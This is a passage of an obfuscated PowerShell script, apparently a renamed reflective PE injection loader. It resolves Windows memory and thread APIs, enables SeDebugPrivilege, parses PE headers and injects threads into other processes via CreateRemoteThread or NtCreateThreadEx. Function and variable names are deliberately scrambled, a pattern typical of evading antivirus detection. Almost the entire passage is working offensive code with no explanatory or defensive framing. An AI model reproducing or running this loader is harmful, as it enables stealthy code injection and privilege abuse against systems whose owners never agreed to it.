        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }
    Function illustrate
    {
        $iAJTLnuo99 = New-Object System.Object
        
        $dBOclCxh99 = Magoo kernel32.dll VirtualAlloc
        $BrIudHjo99 = invoke @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $UEyctIyu99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($dBOclCxh99, $BrIudHjo99)
        $iAJTLnuo99 | Add-Member NoteProperty -Name VirtualAlloc -Value $UEyctIyu99
        
        $AxwzyEnt99 = Magoo kernel32.dll VirtualAllocEx
        $UhzCNEEG99 = invoke @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $aRlTnFAu99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AxwzyEnt99, $UhzCNEEG99)
        $iAJTLnuo99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $aRlTnFAu99
        
        $RiZWInfi99 = Magoo msvcrt.dll memcpy
        $GNzLOLXN99 = invoke @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $NlKvasnw99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RiZWInfi99, $GNzLOLXN99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $NlKvasnw99
        
        $IyxflGaf99 = Magoo msvcrt.dll memset
        $xLrKSsnb99 = invoke @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $vRQWPRWo99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IyxflGaf99, $xLrKSsnb99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name memset -Value $vRQWPRWo99
        
        $KlxOulyM99 = Magoo kernel32.dll LoadLibraryA
        $jkulcDTD99 = invoke @([String]) ([IntPtr])
        $mBIKdGqN99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KlxOulyM99, $jkulcDTD99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $mBIKdGqN99
        
        $GYEoVwJW99 = Magoo kernel32.dll GetProcAddress
        $wOnTpJOq99 = invoke @([IntPtr], [String]) ([IntPtr])
        $GdARcIXo99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GYEoVwJW99, $wOnTpJOq99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GdARcIXo99
        
        $MPTaGgtq99 = Magoo kernel32.dll GetProcAddress
        $KxGeURmB99 = invoke @([IntPtr], [IntPtr]) ([IntPtr])
        $DutuGvkS99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MPTaGgtq99, $KxGeURmB99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $DutuGvkS99
        
        $cLtofaZr99 = Magoo kernel32.dll VirtualFree
        $EQoRQyAH99 = invoke @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $jzefLTcu99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cLtofaZr99, $EQoRQyAH99)
        $iAJTLnuo99 | Add-Member NoteProperty -Name VirtualFree -Value $jzefLTcu99
        
        $FdQRhAUz99 = Magoo kernel32.dll VirtualFreeEx
        $gNSqItkp99 = invoke @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $kwIjNCgm99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FdQRhAUz99, $gNSqItkp99)
        $iAJTLnuo99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $kwIjNCgm99
        
        $TLgbfZEP99 = Magoo kernel32.dll VirtualProtect
        $qxnDfDXI99 = invoke @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $rPHFCHeA99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TLgbfZEP99, $qxnDfDXI99)
        $iAJTLnuo99 | Add-Member NoteProperty -Name VirtualProtect -Value $rPHFCHeA99
        
        $Ftyfvpwv99 = Magoo kernel32.dll GetModuleHandleA
        $edNsXXSL99 = invoke @([String]) ([IntPtr])
        $AchhUVxt99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Ftyfvpwv99, $edNsXXSL99)
        $iAJTLnuo99 | Add-Member NoteProperty -Name GetModuleHandle -Value $AchhUVxt99
        
        $SzwGtANy99 = Magoo kernel32.dll FreeLibrary
        $NBuUBJEC99 = invoke @([IntPtr]) ([Bool])
        $ubmYmmXq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SzwGtANy99, $NBuUBJEC99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $ubmYmmXq99
        
        $YCDCJdcF99 = Magoo kernel32.dll OpenProcess
        $BjneQvIu99 = invoke @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $cApxjted99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YCDCJdcF99, $BjneQvIu99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $cApxjted99
        
        $hSaEiQsc99 = Magoo kernel32.dll WaitForSingleObject
        $YYnFrTtG99 = invoke @([IntPtr], [UInt32]) ([UInt32])
        $pqjaCdBo99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($hSaEiQsc99, $YYnFrTtG99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $pqjaCdBo99
        
        $WXPpaawa99 = Magoo kernel32.dll WriteProcessMemory
        $LbVpxGOZ99 = invoke @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $HEOiunZd99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WXPpaawa99, $LbVpxGOZ99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $HEOiunZd99
        
        $wmUTGlEk99 = Magoo kernel32.dll ReadProcessMemory
        $HXVoNCCg99 = invoke @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $MxvtrFBz99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wmUTGlEk99, $HXVoNCCg99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $MxvtrFBz99
        
        $qxqsrxAV99 = Magoo kernel32.dll CreateRemoteThread
        $cOBCjgZG99 = invoke @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $KJSBzDci99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qxqsrxAV99, $cOBCjgZG99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $KJSBzDci99
        
        $WxFEPIbk99 = Magoo kernel32.dll GetExitCodeThread
        $zHPZseye99 = invoke @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $NzgxAGZL99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WxFEPIbk99, $zHPZseye99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $NzgxAGZL99
        
        $GbRTypHp99 = Magoo Advapi32.dll OpenThreadToken
        $veshtxox99 = invoke @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $leeWVwzO99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GbRTypHp99, $veshtxox99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $leeWVwzO99
        
        $zRnlbWzf99 = Magoo kernel32.dll GetCurrentThread
        $zIKFOOLB99 = invoke @() ([IntPtr])
        $PLBOywZz99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zRnlbWzf99, $zIKFOOLB99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $PLBOywZz99
        
        $jvVhofGv99 = Magoo Advapi32.dll AdjustTokenPrivileges
        $KgfqzCNu99 = invoke @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $PCMgZXox99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($jvVhofGv99, $KgfqzCNu99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $PCMgZXox99
        
        $YWYAFGIx99 = Magoo Advapi32.dll LookupPrivilegeValueA
        $MKILsRRh99 = invoke @([String], [String], [IntPtr]) ([Bool])
        $uGoJSczL99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YWYAFGIx99, $MKILsRRh99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $uGoJSczL99
        
        $sutivJhn99 = Magoo Advapi32.dll ImpersonateSelf
        $RAxDmerO99 = invoke @([Int32]) ([Bool])
        $YCNzwMbb99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($sutivJhn99, $RAxDmerO99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $YCNzwMbb99
        
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $doDLoEKN99 = Magoo NtDll.dll NtCreateThreadEx
            $ZOMnFWag99 = invoke @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $OmkAEaGk99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($doDLoEKN99, $ZOMnFWag99)
            $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $OmkAEaGk99
        }
        
        $yjnMHFhV99 = Magoo Kernel32.dll IsWow64Process
        $sozZsfes99 = invoke @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $dClZHUTi99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yjnMHFhV99, $sozZsfes99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $dClZHUTi99
        
        $jMcIvmJs99 = Magoo Kernel32.dll CreateThread
        $zChZULFS99 = invoke @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $ZlAtgVVi99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($jMcIvmJs99, $zChZULFS99)
        $iAJTLnuo99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $ZlAtgVVi99
    
        $beZsaGTL99 = Magoo kernel32.dll VirtualFree
        $TcuVQjPX99 = invoke @([IntPtr])
        $ULEOvTdX99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($beZsaGTL99, $TcuVQjPX99)
        $iAJTLnuo99 | Add-Member NoteProperty -Name LocalFree -Value $ULEOvTdX99
        return $iAJTLnuo99
    }
            
    Function creaking
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $uXOkdpds99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $VtojIIIp99
        )
        
        [Byte[]]$AxBbocat99 = [BitConverter]::GetBytes($uXOkdpds99)
        [Byte[]]$qVtVLqOd99 = [BitConverter]::GetBytes($VtojIIIp99)
        [Byte[]]$XVWMTWPr99 = [BitConverter]::GetBytes([UInt64]0)
        if ($AxBbocat99.Count -eq $qVtVLqOd99.Count)
        {
            $GfTUoTzc99 = 0
            for ($i = 0; $i -lt $AxBbocat99.Count; $i++)
            {
                $Val = $AxBbocat99[$i] - $GfTUoTzc99
                if ($Val -lt $qVtVLqOd99[$i])
                {
                    $Val += 256
                    $GfTUoTzc99 = 1
                }
                else
                {
                    $GfTUoTzc99 = 0
                }
                
                
                [UInt16]$Sum = $Val - $qVtVLqOd99[$i]
                $XVWMTWPr99[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($XVWMTWPr99, 0)
    }
    
    Function Ute
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $uXOkdpds99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $VtojIIIp99
        )
        
        [Byte[]]$AxBbocat99 = [BitConverter]::GetBytes($uXOkdpds99)
        [Byte[]]$qVtVLqOd99 = [BitConverter]::GetBytes($VtojIIIp99)
        [Byte[]]$XVWMTWPr99 = [BitConverter]::GetBytes([UInt64]0)
        if ($AxBbocat99.Count -eq $qVtVLqOd99.Count)
        {
            $GfTUoTzc99 = 0
            for ($i = 0; $i -lt $AxBbocat99.Count; $i++)
            {
                [UInt16]$Sum = $AxBbocat99[$i] + $qVtVLqOd99[$i] + $GfTUoTzc99
                $XVWMTWPr99[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $GfTUoTzc99 = 1
                }
                else
                {
                    $GfTUoTzc99 = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($XVWMTWPr99, 0)
    }
    
    Function audiovisual
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $uXOkdpds99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $VtojIIIp99
        )
        
        [Byte[]]$AxBbocat99 = [BitConverter]::GetBytes($uXOkdpds99)
        [Byte[]]$qVtVLqOd99 = [BitConverter]::GetBytes($VtojIIIp99)
        if ($AxBbocat99.Count -eq $qVtVLqOd99.Count)
        {
            for ($i = $AxBbocat99.Count-1; $i -ge 0; $i--)
            {
                if ($AxBbocat99[$i] -gt $qVtVLqOd99[$i])
                {
                    return $true
                }
                elseif ($AxBbocat99[$i] -lt $qVtVLqOd99[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    
    Function hauler
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$SwAvJICs99 = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($SwAvJICs99, 0))
    }
    
    
    Function commemorative
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $QkQUtuMd99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$aPUMpHWi99 = [IntPtr](Ute ($StartAddress) ($Size))
        
        $kGmlzGyh99 = $PEInfo.EndAddress
        
        if ((audiovisual ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $QkQUtuMd99"
        }
        if ((audiovisual ($aPUMpHWi99) ($kGmlzGyh99)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $QkQUtuMd99"
        }
    }
    
    
    Function bashfully
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $cLHURWJZ99
        )
    
        for ($PJonkpXr99 = 0; $PJonkpXr99 -lt $Bytes.Length; $PJonkpXr99++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($cLHURWJZ99, $PJonkpXr99, $Bytes[$PJonkpXr99])
        }
    }
    
    Function invoke
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $PEeUxUsj99 = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )
        $zBWaDWMt99 = [AppDomain]::CurrentDomain
        $yeubiToV99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $PLzrHAcM99 = $zBWaDWMt99.DefineDynamicAssembly($yeubiToV99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $PVnZQIQf99 = $PLzrHAcM99.DefineDynamicModule('InMemoryModule', $false)
        $tZbjmwnm99 = $PVnZQIQf99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $AzVXbMoc99 = $tZbjmwnm99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $PEeUxUsj99)
        $AzVXbMoc99.SetImplementationFlags('Runtime, Managed')
        $sAwIKyjt99 = $tZbjmwnm99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $PEeUxUsj99)
        $sAwIKyjt99.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $tZbjmwnm99.CreateType()
    }
    Function Magoo
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $ZQsPRuzU99
        )
        $nnbbRZbC99 = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $YVJYtWQq99 = $nnbbRZbC99.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $AchhUVxt99 = $YVJYtWQq99.GetMethod('GetModuleHandle')
        $GdARcIXo99 = $YVJYtWQq99.GetMethod('GetProcAddress')
        $QJCqrFUh99 = $AchhUVxt99.Invoke($null, @($Module))
        $FRdNLaYa99 = New-Object IntPtr
        $vLSWwBkj99 = New-Object System.Runtime.InteropServices.HandleRef($FRdNLaYa99, $QJCqrFUh99)
        Write-Output $GdARcIXo99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$vLSWwBkj99, $ZQsPRuzU99))
    }
    
    
    Function oilfields
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $iAJTLnuo99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $EdirUAaY99,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$LDinkNkr99 = $iAJTLnuo99.GetCurrentThread.Invoke()
        if ($LDinkNkr99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$pAlFzFMd99 = [IntPtr]::Zero
        [Bool]$uaKDlBLQ99 = $iAJTLnuo99.OpenThreadToken.Invoke($LDinkNkr99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$pAlFzFMd99)
        if ($uaKDlBLQ99 -eq $false)
        {
            $YtnpfSOm99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($YtnpfSOm99 -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $uaKDlBLQ99 = $iAJTLnuo99.ImpersonateSelf.Invoke(3)
                if ($uaKDlBLQ99 -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $uaKDlBLQ99 = $iAJTLnuo99.OpenThreadToken.Invoke($LDinkNkr99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$pAlFzFMd99)
                if ($uaKDlBLQ99 -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $YtnpfSOm99"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EdirUAaY99.LUID))
        $uaKDlBLQ99 = $iAJTLnuo99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($uaKDlBLQ99 -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }
        [UInt32]$hiQsEouW99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EdirUAaY99.TOKEN_PRIVILEGES)
        [IntPtr]$FhUKKlvy99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($hiQsEouW99)
        $GgbvWdVg99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FhUKKlvy99, [Type]$EdirUAaY99.TOKEN_PRIVILEGES)
        $GgbvWdVg99.PrivilegeCount = 1
        $GgbvWdVg99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$EdirUAaY99.LUID)
        $GgbvWdVg99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GgbvWdVg99, $FhUKKlvy99, $true)
        $uaKDlBLQ99 = $iAJTLnuo99.AdjustTokenPrivileges.Invoke($pAlFzFMd99, $false, $FhUKKlvy99, $hiQsEouW99, [IntPtr]::Zero, [IntPtr]::Zero)
        $YtnpfSOm99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($uaKDlBLQ99 -eq $false) -or ($YtnpfSOm99 -ne 0))
        {
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FhUKKlvy99)
    }
    
    
    Function aggravation
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $eXFgjlah99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $HxFHblGZ99 = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $iAJTLnuo99
        )
        
        [IntPtr]$CGXHnQPg99 = [IntPtr]::Zero
        
        $bROTsdRB99 = [Environment]::OSVersion.Version
        if (($bROTsdRB99 -ge (New-Object 'Version' 6,0)) -and ($bROTsdRB99 -lt (New-Object 'Version' 6,2)))
        {
            Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $UDnqrPTB99= $iAJTLnuo99.NtCreateThreadEx.Invoke([Ref]$CGXHnQPg99, 0x1FFFFF, [IntPtr]::Zero, $eXFgjlah99, $StartAddress, $HxFHblGZ99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $WPvsjDqE99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($CGXHnQPg99 -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $UDnqrPTB99. LastError: $WPvsjDqE99"
            }
        }
        else
        {
            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $CGXHnQPg99 = $iAJTLnuo99.CreateRemoteThread.Invoke($eXFgjlah99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $HxFHblGZ99, 0, [IntPtr]::Zero)
        }
        
        if ($CGXHnQPg99 -eq [IntPtr]::Zero)
        {
            Write-Verbose "Error creating remote thread, thread handle is null"
        }
        
        return $CGXHnQPg99
    }
    
    Function ghostwrite
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $KspyWyNs99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $EdirUAaY99
        )
        
        $mczPkhvt99 = New-Object System.Object
        
        $mDQgBFky99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($KspyWyNs99, [Type]$EdirUAaY99.IMAGE_DOS_HEADER)
        [IntPtr]$ryxizTxb99 = [IntPtr](Ute ([Int64]$KspyWyNs99) ([Int64][UInt64]$mDQgBFky99.e_lfanew))
        $mczPkhvt99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $ryxizTxb99
        $IOWkDDRN99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ryxizTxb99, [Type]$EdirUAaY99.IMAGE_NT_HEADERS64)
        
        if ($IOWkDDRN99.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($IOWkDDRN99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $mczPkhvt99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $IOWkDDRN99
            $mczPkhvt99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $qYXfMvlf99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ryxizTxb99, [Type]$EdirUAaY99.IMAGE_NT_HEADERS32)
            $mczPkhvt99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $qYXfMvlf99
            $mczPkhvt99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $mczPkhvt99
    }
    Function cherubim
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $xyBDLqMD99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $EdirUAaY99
        )
        
        $PEInfo = New-Object System.Object
        
        [IntPtr]$ueXxOqCp99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($xyBDLqMD99.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($xyBDLqMD99, 0, $ueXxOqCp99, $xyBDLqMD99.Length) | Out-Null
        
        $mczPkhvt99 = ghostwrite -KspyWyNs99 $ueXxOqCp99 -EdirUAaY99 $EdirUAaY99
        
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($mczPkhvt99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($mczPkhvt99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($mczPkhvt99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($mczPkhvt99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($mczPkhvt99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ueXxOqCp99)
        
        return $PEInfo
    }
    Function unofficially
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $KspyWyNs99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $EdirUAaY99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($KspyWyNs99 -eq $null -or $KspyWyNs99 -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        $mczPkhvt99 = ghostwrite -KspyWyNs99 $KspyWyNs99 -EdirUAaY99 $EdirUAaY99
        
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $KspyWyNs99
